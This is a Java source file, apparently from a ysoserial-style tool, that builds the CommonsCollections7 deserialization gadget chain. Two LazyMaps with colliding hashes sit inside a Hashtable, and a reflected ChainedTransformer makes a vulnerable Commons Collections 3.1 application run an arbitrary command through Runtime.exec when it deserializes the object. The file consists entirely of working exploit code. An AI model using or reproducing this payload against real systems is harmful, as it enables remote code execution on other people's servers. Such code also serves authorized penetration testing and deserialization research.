package A.R.ysogate.payloads.gadgets;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.map.LazyMap;

import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Authors;
import A.R.ysogate.payloads.annotation.Dependencies;
import A.R.ysogate.payloads.util.Reflections;
import A.R.ysogate.payloads.util.TransformerUtil;

import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/*
    Payload method chain:

    java.util.Hashtable.readObject
    java.util.Hashtable.reconstitutionPut
    org.apache.commons.collections.map.AbstractMapDecorator.equals
    java.util.AbstractMap.equals
    org.apache.commons.collections.map.LazyMap.get
    org.apache.commons.collections.functors.ChainedTransformer.transform
    org.apache.commons.collections.functors.InvokerTransformer.transform
    java.lang.reflect.Method.invoke
    sun.reflect.DelegatingMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke0
    java.lang.Runtime.exec
*/

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.SCRISTALLI, Authors.HANYRAX, Authors.EDOARDOVIGNATI})

public class CommonsCollections7 implements ObjectPayload<Hashtable> {

	public Hashtable getObject(final String command) throws Exception {

		final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

		final Transformer[] transformers = TransformerUtil.makeTransformer(command);

		Map innerMap1 = new HashMap();
		Map innerMap2 = new HashMap();

		// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
		Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
		lazyMap1.put("yy", 1);

		Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
		lazyMap2.put("zZ", 1);

		// Use the colliding Maps as keys in Hashtable
		Hashtable hashtable = new Hashtable();
		hashtable.put(lazyMap1, 1);
		hashtable.put(lazyMap2, 2);

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

		// Needed to ensure hash collision after previous manipulations
		lazyMap2.remove("yy");

		return hashtable;
	}
}
